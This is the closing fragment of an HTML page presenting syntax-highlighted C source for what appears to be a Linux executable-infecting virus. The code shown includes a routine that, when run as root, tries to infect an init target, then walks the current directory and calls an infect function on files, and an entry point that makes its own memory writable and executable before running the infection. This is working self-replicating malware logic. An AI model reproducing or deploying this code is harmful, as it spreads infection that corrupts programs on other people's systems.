    </span><span class="sc11">_free</span><span class="sc10">(</span><span class="sc11">zero</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">cleanup</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_unlink</span><span class="sc10">(</span><span class="sc11">tempname</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">bin_error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">free_bin</span><span class="sc10">(&amp;</span><span class="sc11">bin</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">in</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">out</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc9">#define TRY_LIMIT   10
</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">_vstart</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">[</span><span class="sc4">8192</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">d</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">numd</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getdataseg</span><span class="sc10">();</span><span class="sc0">

    </span><span class="sc11">malloc_init</span><span class="sc10">();</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_geteuid</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">try_infect</span><span class="sc10">(&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">INIT</span><span class="sc10">]);</span><span class="sc0">
    </span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_open</span><span class="sc10">(&amp;</span><span class="sc11">data</span><span class="sc10">[</span><span class="sc11">DOT</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">O_RDONLY</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">_getdents</span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">n</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">cleanup</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">infect</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc11">dirp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">dirent</span><span class="sc0"> </span><span class="sc10">*)&amp;</span><span class="sc11">d</span><span class="sc10">[</span><span class="sc11">r</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_reclen</span><span class="sc10">]</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc11">TRY_LIMIT</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">try_infect</span><span class="sc10">(</span><span class="sc11">dirp</span><span class="sc10">-&gt;</span><span class="sc11">d_name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">++</span><span class="sc11">infect</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">cleanup</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_close</span><span class="sc10">(</span><span class="sc11">dd</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">freeall</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">virendall</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">_start</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">_mprotect</span><span class="sc10">(</span><span class="sc0">
        </span><span class="sc10">(</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">*)((</span><span class="sc16">long</span><span class="sc10">)</span><span class="sc11">virstart</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(~</span><span class="sc11">PAGE_MASK</span><span class="sc10">)),</span><span class="sc0">
        </span><span class="sc11">PAGE_SIZE</span><span class="sc0"> </span><span class="sc10">&lt;&lt;</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0">
        </span><span class="sc11">PROT_READ</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">PROT_WRITE</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">PROT_EXEC</span><span class="sc0">
    </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">_vstart</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc11">error</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">_exit</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
